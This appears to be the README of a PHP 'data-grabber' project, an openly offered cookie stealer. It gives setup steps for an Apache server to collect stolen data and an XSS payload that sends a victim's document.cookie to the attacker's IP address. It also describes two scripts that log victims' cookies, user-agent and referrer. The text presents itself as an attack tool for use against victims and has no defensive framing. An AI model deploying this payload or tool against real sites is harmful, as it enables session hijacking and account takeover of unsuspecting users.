# data-grabber
web data grabber in PHP

## usage
#### step1 - start web server on your own web server
```
sudo apt update && apt upgrade -y
sudo apt install apache2
sudo systemctl start apache 2
```

#### step2 
clone the repository in ``` /var/www/html/ ``` directory

#### step3
now if any cookie or data sent to your webserver by your link, it'll save in cookie file.
example of link:
```
http://192.168.1.135/p1.php?txt=your-data
```

#### Payload
here is some payload for vulnerabilities like XSS to steal cookies of your victim:
```
<script>window.location="http://192.168.1.135/wdata-grabber/p1.php?txt="+document.cookie</script>
```

### p1.php
p1.php is basic version of cookie stealer that recieve and store just value of txt parameter.

### p2.php
p2.php store more data from victim. you can store ``` date user-agent referrer ``` too.
